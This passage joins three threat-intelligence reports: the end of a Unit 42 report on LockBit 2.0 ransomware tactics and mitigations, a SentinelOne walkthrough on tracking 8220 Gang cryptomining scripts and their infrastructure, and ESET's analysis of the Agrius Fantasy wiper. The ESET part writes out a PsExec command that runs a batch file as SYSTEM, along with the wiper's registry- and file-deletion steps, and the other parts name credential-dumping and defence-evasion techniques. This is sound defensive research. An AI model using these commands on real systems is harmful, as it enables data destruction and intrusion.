TA0005 Defense Evasion T1070 Indicator Removal on Host Indicators, such as logs in Windows Event Logs or malicious files, are typically removed using wevtutil, a batch script, or CCleaner. 
T1140 Deobfuscate/Decode Files or Information Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded. 
T1484.001 Domain Policy Modification:
Group Policy Modification LockBit 2.0 has been seen using the PowerShell module InvokeGPUpdate to update the group policy. 
T1562.001
Impair Defenses: Disable or Modify Tools Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool, a batch script or a specially crafted command line script. 
T1564.003
Hide Artifacts: Hidden Window Affiliates use hidden windows to hide malicious activity from plain sight. 
TA0006 Credential Access T1003 OS Credential Dumping As seen with other ransomware cases, Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well. 
T1555 Credentials from Password Stores LockBit 2.0 has been seen utilizing numerous tools to dump passwords from password stores and Chrome using GrabChrome and GrabRFF. 
TA0007 Discovery T1046 Network Service Discovery Both Advanced Port Scanner and NetScan have been used to discover local network infrastructure devices and services running on remote hosts.
Active Directory queries for remote systems have been performed by ADFind. 
T1057 Process Discovery Process Explorer, Process Monitor and PCHunter have been utilized to discover any anti-malware or monitoring software and terminate it. 
T1082 System Information Discovery LockBit 2.0 enumerates system information such as hostname, shares, and domain information. 
T1614 System Location Discovery Attempts to check the language settings. 
TA00008 Lateral Movement T1021
Remote Services Although Cobalt Strike has many capabilities beneficial to threat actors in ransomware attacks, it was mainly seen in LockBit 2.0 investigations acting as a command and control beacon, a method of lateral movement and a tool for downloading/executing files. 
T1021.002 Remote Services: SMB/Windows Admin Shares LockBit 2.0 has been known to self-propagate via SMB. 
TA0010 Exfiltration T1030 Data Transfer Size Limits In some cases, LockBit 2.0 will limit the data transfer sizes to fly under the radar of any monitoring services a client may have set up. 
T1041 Exfiltration over C2 Channel MEGASync is the leading way for LockBit 2.0 affiliates to exfiltrate data from clients with it being occasionally replaced by RClone. TA0011 Command and Control T1219
Remote Access Software AnyDesk has been the most common legitimate desktop software used to establish an interactive command and control channel, with ConnectWise seen slightly less frequently. 
TA0040 Impact T1486 Data Encrypted for Impact LockBit 2.0 is known for its extortion tactics, encrypting devices and demanding a ransom. 
T1489 Service Stop During the defense evasion phase, anti-malware and monitoring software is often disabled.
Firewall rules have occasionally been seen being disabled as well. 
LockBit 2.0 Technical Details LockBit 2.0 was developed using the Assembly and Origin C programming languages and leverages advanced encryption standard (AES) and elliptic-curve cryptography (ECC) algorithms to encrypt victim data.
It can affect both Windows and Linux OS, as the operator released a Linux version of LockBit 2.0 to target VMware ESXi hypervisor systems in October 2021, coded exclusively in the C programming language. 
The LockBit group claimed that LockBit 2.0 is “the fastest encryption software all over the world” and provided a comparative table showing the encryption speed of various ransomware samples. 
Figure 8.
LockBit encryption comparative table | Source:
LockBit blog.
LockBit 2.0 also contains a self-spreading feature, clears logs and can print the ransom note on network printers until the paper runs out. 
A management panel that affiliates can use to manage victims and affiliate accounts, generate new ransomware builds and generate the decryptor if the demanded ransom is paid also exists. 
Figure 9.
LockBit 2.0 management panel.
Source: ProDaft.
LockBit 2.0 operators also released an information-stealer dubbed StealBit, which was developed to support affiliates of the LockBit 2.0 RaaS when exfiltrating data from breached companies. 
StealBit contains the following capabilities: Operates as a file grabber and dumps/uploads victim data to the LockBit victim-shaming site. 
No reliance on third-party cloud file-sharing services, where data can be easily removed if the victim submitted a complaint. 
The download speed is limited only by internet connection bandwidth, so it is possible to clone folders from corporate networks and upload them to the LockBit victim shaming blog quickly. 
The operator of LockBit 2.0 has provided a comparative table speed showing the information stealer compared to other tools. Figure 10.
LockBit 2.0 download speed, according to LockBit 2.0 operator.
LockBit 3.0 There was a bug that existed in LockBit 2.0 that allowed researchers to revert the encryption process on an MSSQL database.
After the bug’s disclosure, LockBit forum members discussed how the bug will not exist in LockBit’s next iteration.
Moreover, on March 17, LockBit forum members mentioned the release of LockBit’s next version in one or two weeks.
On March 25, VX underground posted a tweet with details of this new version, dubbed LockBit Black. Figure 11.
LockBit Black post-infection desktop wallpaper (Source: VX-underground).Courses of Action Several adversarial techniques were observed in this activity and the following measures are suggested within Palo Alto Networks products and services to ensure mitigation of threats related to LockBit 2.0 ransomware, as well as other malware using similar techniques: Product / Service Course of Action Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion The courses of action below mitigate the following techniques: Exploit Public-Facing Application
[T1190], Command and Scripting Interpreter [T1059], Local Account [T1136.001], Web Shell
[T1505.003], Exploitation for Privilege Escalation
[T1068], Indicator Removal on Host [T1070], Deobfuscate/Decode Files or Information
[T1140], Disable or Modify Tools [T1562.001], Hidden Window [T1564.003], Valid Accounts
[T1078], External Remote Services [T1133], Scheduled Task
[T1053.005],
Bypass User Account Control
[T1548.002],
Group Policy Modification
[T1484.001] THREAT PREVENTION Ensure a secure Vulnerability Protection Profile is applied to all security rules allowing traffic Ensure a Vulnerability Protection Profile is set to block attacks against critical and high vulnerabilities, and set to default on medium, low, and informational vulnerabilities Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the internet Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use CORTEX XSOAR Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Impossible Traveler NEXT-GENERATION FIREWALLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure that the User-ID service account does not have interactive logon rights Define at least one 'Include Network'. 
Ensure that User-ID is only enabled for internal trusted interfaces Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that the User-ID Agent has minimal permissions if User-ID is enabled CORTEX XDR PREVENT Enable Anti-Malware Protection Enable Anti-Exploit Protection Configure Host Firewall Profile Configure Behavioral Threat Protection under the Malware Security Profile Credential Access The courses of action below mitigate the following techniques: OS Credential Dumping [T1003], Credentials from Password Stores
[T1555] CORTEX XDR PREVENT Enable Anti-Exploit Protection Enable Anti-Malware Protection Discovery The below courses of action mitigate the following techniques: Network Service Scanning [T1046],
Process Discovery
[T1057], System Location Discovery
[T1614], System Information Discovery [T1082] CORTEX XDR PREVENT Configure Behavioral Threat Protection under the Malware Security Profile NEXT-GENERATION FIREWALLS Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XSOAR Deploy XSOAR Playbook - Port Scan Lateral Movement The courses of action below mitigate the following techniques: Remote Services [T1021], SMB/Windows Admin Shares
[T1021.002] NEXT-GENERATION FIREWALLS Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that User-ID is only enabled for internal trusted interfaces Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones CORTEX XSOAR Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Access Investigation Playbook Command and Control 
The courses of action below mitigate the following techniques: Remote Access Software [T1219] NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure that access to every URL is logged CORTEX XSOAR Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Exfiltration 
The courses of action below mitigate the following techniques: Data Transfer Size Limits
[T1030], Exfiltration Over C2 Channel [T1041] THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet 
Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure that PAN-DB URL Filtering is used Ensure that access to every URL is logged Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure secure URL filtering is enabled for all security policies allowing traffic to the internet 
Ensure all HTTP Header Logging options are enabled CORTEX XSOAR Deploy XSOAR Playbook - Block URL Deploy XSOAR Playbook - PAN-OS Query Logs for Indicators Deploy XSOAR Playbook - Block IP DNS SECURITY Enable DNS Security in Anti-Spyware profile NEXT-GENERATION FIREWALLS Setup NetFlow Monitoring Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Impact The courses of action below mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489] CORTEX XSOAR Deploy XSOAR Playbook - Ransomware Manual for incident response. 
†These capabilities are part of the NGFW security subscriptions service Note: This is not an all-inclusive list of the protections provided by Palo Alto Networks.
This is a subset of our current Courses of Action initiative and will be updated as the project progresses. 
Conclusion LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole.
With claims of this RaaS offering the fastest encryption on the ransomware market, coupled with the fact that it has been delivered in high volume by experienced affiliates, this RaaS poses a significant threat.
LockBit’s continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape. 
Palo Alto Networks detects and prevents LockBit 2.0 ransomware in the following ways: WildFire:
All known samples are identified as malware. 
Cortex XDR: Identifies indicators associated with LockBit 2.0. 
Anti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows. 
Local Analysis detection for LockBit 2.0 binaries on Windows. 
Next-Generation Firewalls:
DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. 
Appendix A 
In August 2021, a Russian blogger published a 22-minute interview with an alleged representative of the group behind LockBit 2.0 called “LockBitSupp” on a YouTube channel called “Russian-language open source intelligence (OSINT).”
The same Russian blogger previously published interviews with a representative of the group behind the REvil ransomware-as-a-service (RaaS), hackers and security experts. 
Some key takeaways from the claims made in the interview were: The LockBit 2.0 threat actor claimed the group’s RaaS was unlikely to be rebranded since the team allegedly was a business that was honest with their customers – suggesting a supposed contrast between LockBit 2.0 and Avaddon, DarkSide and REvil affiliates. 
The LockBit 2.0 ransomware disregarded keyboard layout, but it allegedly would not run on a host where the system language was set to any of the languages spoken in the Commonwealth of Independent States region. 
The group did not devise attacks on companies of their choice; they simply worked with initial access to any corporate network they obtained elsewhere, since this was more profitable and saved time.
The team selected targets for ransomware attacks based on the company’s finances — the bigger, the better.
The location also did not matter.
However, team members allegedly did not attack healthcare facilities, social services, educational institutions and charitable organizations or any other organization that “contributed to the survival of the human race.”
[Note that Unit 42 case data does include indications that threat actors using LockBit 2.0 have targeted healthcare organizations at times.] 
The threat actor claimed that the largest number of victims who paid ransom were company representatives who did not care about creating backup copies and did not protect their sensitive data.
According to the threat actor’s claims, companies that violated regulations about collecting and handling customer or user personal information were among those eager to pay.
The threat actor claimed that there generally were only a few companies who refused to pay ransom on principle, while most of the victims evaluated profit and loss to decide whether or not to pay a ransom. 
LockBit 2.0 operators allegedly almost always offered discounts to their victims since the goal was to streamline attacks. 
The threat actor claimed that the COVID-19 pandemic facilitated ransomware attacks significantly, saying it was easy to compromise home computers of employees who work remotely and use them as a springboard to access other networked systems. 
Companies in Europe and the U.S. were hit with ransomware much more often than companies based in other countries allegedly because of high profit and insurance and not because of language barriers. 
Ransomware operators usually recruit negotiators, who coerce victims to pay ransom, since professional penetration testers allegedly lack the time for chatter. 
Additional Resources LockBit 3.0: Another Upgrade to the World’s Most Active RansomwareRansomware Groups to Watch: Emerging ThreatsAverage Ransom Payment Up 71% This Year, Approaches $1 Million2022 Unit 42 Ransomware Threat Report Highlights Get updates from Palo Alto Networks! 
Sign up to receive the latest news, cyber threat intelligence and research from us 
title: SOC Team Essentials | How to Investigate and Track the 8220 Gang Cloud Threat url: https://www.sentinelone.com/blog/soc-team-essentials-how-to-investigate-and-track-the-8220-gang-cloud-threat/ 8220 Gang is a low-skill crimeware actor known for infecting cloud hosts through n-day vulnerabilities and remote access brute forcing.
We have previously detailed how 8220 expanded its botnet and rotated its infrastructure.
Since our last write up in October, the group has again switched to new infrastructure and samples, providing us with an opportunity to share an educational walkthrough of the process of investigating cybercrime activity that may be useful to new or lesser experienced SOC teams, analysts and researchers. 
In this post, we use 8220 Gang activity as a lens through which to explain the process of investigating a threat, researching the threat activity as a whole, and gaining a perspective into attacker objectives, ultimately concluding with a wider understanding of related threat intelligence. 
Refresher on 8220 Gang 8220 Gang (pronounced eighty-two twenty), also known as 8220 Mining Group, was first publicly reported by Talos in 2018.
Victims of 8220 Gang are typically, but not exclusively, users of cloud networks operating vulnerable and misconfigured Linux applications and services. 
Attacks make use of SSH brute forcing post-infection to automate local and global spreading attempts.
Victims using cloud infrastructure (AWS, Azure, GCP, Aliyun, QCloud) are often infected via publicly accessible hosts running Docker, Confluence, Apache WebLogic, and Redis.
Victims are not targeted geographically but simply identified by their internet accessibility. 
Initial Discovery Our walkthrough starts with the initial discovery of an interesting script found on a compromised AWS machine with publicly available SSH service secured with weak credentials.
For readers not running a honeypot, this initial discovery could have also been observed in the monitoring of new files uploaded to file scanning services like VirusTotal or MalShare.
For those looking to monitor this group, international SSH honeypots plus VirusTotal YARA rules offer a reliable method of catching new activity as it occurs. 
The script in question has the SHA1 a9da0947243333d95f84f6a0e37b9fc29b2fb054. 8220 Infection Script Snippet We can see it is quite simple in design and built around the process of downloading and setting persistence of some other file. 
With a few string pivots inside VT, or even a few Google searches, we can quickly discover the core functionality of the script has been widely reported on as it has been reused by many amateur cryptocurrency mining groups and opportunistic profit-seeking attackers. 
Pivoting on part of the script’s content in VirusTotal Intelligence One example of such reporting is our July 2022 post on 8220 Gang expanding their botnet to roughly 30,000 hosts.
However, this time the attacker-specific infrastructure is different, and we have not determined if it has delivered similar malware.
Remember, this “infection script” is used by many attackers, and it alone is a very weak source of attribution. 8220 Infection Script Analysis The script goes through a set of instructions, often at multiple levels of encoded commands, aimed at the delivery of setting persistence on the victim machine by downloading itself from malicious servers.
The multiple levels of Base64 encoding attempt to hide the fact that it is also downloading a specific payload as well.
This is first observed under the createservices function. 
Infection Script createservices Function One difference that’s quickly apparent to past reporting on the script is that the attacker began adding the lwp-download command as a failover for wget and curl to enable downloading commands.
We initially observed this activity on January 6th, and since then the actor has continued to standardize it in their infection scripts today.
Sysdig also noted this activity in a recent blog. 
Infection Script use of lwp-download The key take away from analyzing these infection scripts is noting unique additions, like lwp–download, combined with the destination of download requests.
By clustering infection scripts based on function names and order, if the functions are called, and what infrastructure is associated, we can weed out the non-8220 Gang samples. 
Additionally, we can link this further based on the encoding quantity and repetition to past 8220 Gang samples.
For example, in our infection scripts createservices makes use of three base64 encoded echo commands.
The first command can be decoded into a new script which pings associated attacker infrastructure and then starts a “payload” command. Infection Script’s encoded payload 
The payload contains two additional base64 encoded scripts to set permissions, download, and configure miner and IRC bot infections.
This functionality communicates with 194.38.23[.]170. 
Post-Infection Activity & Sample Pivots The post infection activity for this and other recent 8220 infection scripts evolve slightly, but generally proceed with infecting the victim with an updated PwnRig cryptocurrency miner and IRC bot. 
In the infection scripts we observed in this campaign, the group continued to use old bash IRC bot “Tsunami”.
The sample delivered remains unchanged; however, the network it communicates with evolves over campaigns.
The infection script here delivered 472548a4b8295182f6ba8641d74725c2250b7243 – the Tsunami sample. 
More useful for tracking 8220 Gang are the samples of PwnRig – the custom version of the open source XMRig cryptocurrency miner – that they drop.
In this campaign, the script downloads the UPX packed sample 38be55f1fc4ce1cb5438236abc5077019e5e1cdf, which unpacks to 332485bd460f55117a254f8164736b90d74aa9f6.
A characteristic of 8220 Gang is their repeated use of fake miner pool domains themed around the FBI.
Here, we see this theme again through the use of the malicious domain fbi.su1001-2[.]top. 
Infrastructure Analysis Tracking 8220 Gang is aided somewhat by their failures in infrastructure OPSEC.
Since the beginning of what the industry calls “8220 Gang” the primary method of attribution has been reused infrastructure and identification of newly associated infrastructure.
While this technique alone does not link the actor with certainty, it remains reliable when combined with the previously noted linkability around malware samples delivered. 
During our initial investigation in January, the group was using 185.106.94[.]146, and dw.bpdeliver[.]ru for malware download location post-infection such as in their infection script.
Anyone looking into this group should pivot on all subdomains associated with the actor-controlled domain, in addition to all DNS history of malicious IPs to identify a wider set of the malicious activity. 
For example, the recent dw.bpdeliver[.]ru host resolved to 79.137.203[.]156 during the initial deployment of the script.
More activity of 8220 Gang scripts can be found calling directly to this IP rather than the domain.
The same goes for 185.106.94[.]146, which is called by IP in the script, and which at the time resolved to jira.letmaker.top, a widely reported known 8220 Gang domain. 
Overall, the group is clumsy and unsophisticated in their infrastructure management, providing a good opportunity for those willing to track the mess or cut their teeth in threat actor investigation. 
Our graphic from a previous campaign explains the overlap, which can still be found in this most recent activity. 
Visual Context of 8220 Gang Infrastructure Roles Conclusion Tracking and researching 8220 Gang, which has exhibited a lack of operational security, requires a simple understanding of their use of malicious scripts, malware samples, and malicious infrastructure.
A successful approach to tracking this group can involve monitoring and analyzing malware samples, identifying patterns in their malicious scripts, and mapping out their infrastructure. Indicators of Compromise Indicator Description a9da0947243333d95f84f6a0e37b9fc29b2fb054 8220 Gang Install Script 472548a4b8295182f6ba8641d74725c2250b7243 8220 Gang Bashirc.x86_64 – PackedOld version, “Tsunami” 38be55f1fc4ce1cb5438236abc5077019e5e1cdf 8220 Gang X86_64 – Packed MinerUses fbi.su1001-2[.]top 332485bd460f55117a254f8164736b90d74aa9f6 e2c3e.
Unpacked, PwnRig Miner 194.38.23.170 8220 Gang Infrastructure – Shared jira.letmaker.top 8220 Gang Infrastructure – Reused 185.106.94.146 8220 Gang Infrastructure dw.bpdeliver.ru 8220 Gang Infrastructure – Recent fbi.su1001-2.top 8220 Gang Infrastructure – Recent 79.137.203.156 8220 Gang Infrastructure 
title: Fantasy – a new Agrius wiper deployed through a supply‑chain attack url: https://www.welivesecurity.com/2022/12/07/fantasy-new-agrius-wiper-supply-chain-attack/ ESET researchers analyzed a supply-chain attack abusing an Israeli software developer to deploy Fantasy, Agrius’s new wiper, with victims including the diamond industry ESET researchers discovered a new wiper and its execution tool, both attributed to the Agrius APT group, while analyzing a supply-chain attack abusing an Israeli software developer.
The group is known for its destructive operations. 
In February 2022, Agrius began targeting Israeli HR and IT consulting firms, and users of an Israeli software suite used in the diamond industry.
We believe that Agrius operators conducted a supply-chain attack abusing the Israeli software developer to deploy their new wiper, Fantasy, and a new lateral movement and Fantasy execution tool, Sandals. 
The Fantasy wiper is built on the foundations of the previously reported Apostle wiper but does not attempt to masquerade as ransomware, as Apostle originally did.
Instead, it goes right to work wiping data.
Victims were observed in South Africa – where reconnaissance began several weeks before Fantasy was deployed – Israel, and Hong Kong. 
Key points of this blogpost: Agrius conducted a supply-chain attack abusing an Israeli software suite used in the diamond industry. 
The group then deployed a new wiper we named Fantasy.
Most of its code base comes from Apostle, Agrius’s previous wiper. 
Along with Fantasy, Agrius also deployed a new lateral movement and Fantasy execution tool that we have named Sandals. 
Victims include Israeli HR firms, IT consulting companies, and a diamond wholesaler; a South African organization working in the diamond industry; and a jeweler in Hong Kong. 
Group overview Agrius is a newer Iran-aligned group targeting victims in Israel and the United Arab Emirates since 2020.
The group initially deployed a wiper, Apostle, disguised as ransomware, but later modified Apostle into fully fledged ransomware.
Agrius exploits known vulnerabilities in internet-facing applications to install webshells, then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads. 
Campaign overview On February 20th, 2022 at an organization in the diamond industry in South Africa, Agrius deployed credential harvesting tools, probably in preparation for this campaign.
Then, on March 12th, 2022, Agrius launched the wiping attack by deploying Fantasy and Sandals, first to the victim in South Africa and then to victims in Israel and lastly to a victim in Hong Kong. 
Victims in Israel include an IT support services company, a diamond wholesaler, and an HR consulting firm.
South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler. 
Figure 1.
Victim timeline and locations 
The campaign lasted less than three hours and within that timeframe ESET customers were already protected with detections identifying Fantasy as a wiper, and blocking its execution.
We observed the software developer pushing out clean updates within a matter of hours of the attack.
We reached out to the software developer to notify them about a potential compromise, but our enquiries went unanswered. 
Preparing for departure The first tools deployed by Agrius operators to victim systems, through means unknown, were: MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps” SecretsDump, a Python script that “performs various techniques to dump hashes from [a] remote machine without executing any agent there” Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address. 
Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper.
Agrius operators deployed MiniDump and SecretsDump to this campaign’s first victim on February 20th, 2022, but waited until March 12th, 2022 to deploy Host2IP, Fantasy, and Sandals (consecutively). 
Sandals: Igniting the Fantasy (wiper) 
Sandals is a 32-bit Windows executable written in C#/.NET.
We chose the name because Sandals is an anagram of some of the command line arguments it accepts.
It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string: 
PsExec.exe /accepteula -d -u “<username>”
-p “<password>”
-s “C:\<path>\<GUID>.bat” The PsExec options have the following meanings: -d – Don’t wait for process to terminate (non-interactive). 
/accepteula – Suppress display of the license dialog. 
-s –
Run the remote process in the SYSTEM account. 
Sandals does not write the Fantasy wiper to remote systems.
We believe that the Fantasy wiper is deployed via a supply-chain attack using the software developer’s software update mechanism.
This assessment is based on several factors: all victims were customers of the affected software developer; the Fantasy wiper was named in a similar fashion to legitimate versions of the software; all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and, lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\Windows\Temp, the default temp directory for Windows systems. 
Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution.
Table 1 lists the command line arguments accepted by Sandals. 
Table 1.
Sandals arguments and their descriptions ArgumentDescriptionRequired -f
<filepath>
A path and filename to a file that contains a list of hostnames that should be targeted.
Yes -u <username>
The username that will be used to log into the remote hostname(s) in argument -f.
Yes -p <password>The username that will be used to log into the remote hostname(s) in argument -f.
Yes -l <filepath>The path and filename of the Fantasy wiper on the remote system that will be executed by the batch file created by Sandals.
Yes -d <path>
The location to which Sandals will write the batch file on the remote system.
Default location is %WINDOWS%\Temp.
No -s
<integer>
The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing.
The default is two seconds.
No -a file <filepath> or-a random or-a rsaIf -a is followed by the word file and a path and filename, Sandals uses the encryption key in the supplied file.
If -a is followed by rsa or random, Sandals uses the RSACryptoServiceProvider class to generate a public-private key pair with a key size of 2,048.
No -dn <devicename>Specifies which drive to connect with on a remote system over SMB.
Default is C:.No -ps <filepath>Location of PsExec on disk.
Default is psexec.exe in the current working directory.
No -raIf -ra is supplied at runtime, it sets the variable flag to True (initially set to False).
If flag=True, Sandals deletes all files written to disk in the current working directory.
If flag=False, Sandals skips the file cleanup step.
No The batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.
NewGuid() method.
An example of a Sandals batch file is shown in Figure 2. 
Figure 2.
Sandals batch file (top, in red) and the decoded command line parameter (bottom, in blue) 
The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section).
However, the Fantasy wiper only looks for an argument of 411 and ignores all other runtime input (see the next section for more information). 
Fantasy wiper The Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe, respectively.
Figure 3 depicts the execution flow of the Fantasy wiper. 
Figure 3.
Fantasy wiper execution flow Initially, Fantasy creates a mutex to ensure that only one instance is running.
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.
Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.
GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array.
If a runtime argument of 411 is supplied to the wiper, the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop.
Otherwise, the for loop only overwrites files with a file extension listed in the Appendix. 
Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.
This is presumably done to make recovery and forensic analysis more difficult. 
During the for loop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files.
If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\Temp\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.
File wiping then resumes in the next directory in the target list. 
Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\Temp called registry.bat.
The batch file deletes the following registry keys: HKCR\.EXE HKCR\.dll HKCR\* Then it runs the following to attempt to clear file system cache memory: 
%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks Lastly, registry.bat deletes itself (del %0). 
Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.
Then Fantasy sleeps for two minutes before overwriting the system’s Master Boot Record. 
Fantasy then writes another batch file, %WINDOWS%\Temp\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.
Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) — Other issue. 
It is likely that %SYSTEMDRIVE% recovery is possible.
Victims were observed to be back up and running within a matter of hours. 
Attribution to Agrius Much of the code base from Apostle, initially a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tool.
However, the overall functionality of Fantasy is that of a wiper without any attempt to masquerade as ransomware.
Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively.
There are only a few small tweaks between the original function in Apostle and the Fantasy implementation. 
Figure 4.
File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 4.
File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy. 
Figure 5.
Directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) 
Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy. 
Figure 6.
Recursive directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) 
In addition to the code reuse, we can see remnants of the Apostle execution flow in Fantasy.
In the original analysis of Apostle, SentinelOne notes that “Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an ‘RSAParameters’ object.
This argument is passed on and saved as the Public Key used for the encryption process and is most likely generated on a machine owned by the threat actor.”
We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime.
Fantasy, however, does not use this runtime argument. 
Figure 7.
Sandals passing to Fantasy the same RSAParameters object as was used by Apostle ransomware Conclusion Since its discovery in 2021, Agrius has been solely focused on destructive operations.
To that end, Agrius operators probably executed a supply-chain attack by targeting an Israeli software company’s software updating mechanisms to deploy Fantasy, its newest wiper, to victims in Israel, Hong Kong, and South Africa.
Fantasy is similar in many respects to the previous Agrius wiper, Apostle, that initially masqueraded as ransomware before being rewritten to be actual ransomware.
Fantasy makes no effort to disguise itself as ransomware.
Agrius operators used a new tool, Sandals, to connect remotely to systems and execute Fantasy. 
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. 
ESET Research also offers private APT intelligence reports and data feeds.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
IoCs SHA-1FilenameDetectionDescription 1A62031BBB2C3F55D44F59917FD32E4ED2041224fantasy35.exeMSIL/KillDisk.
IFantasy wiper. 
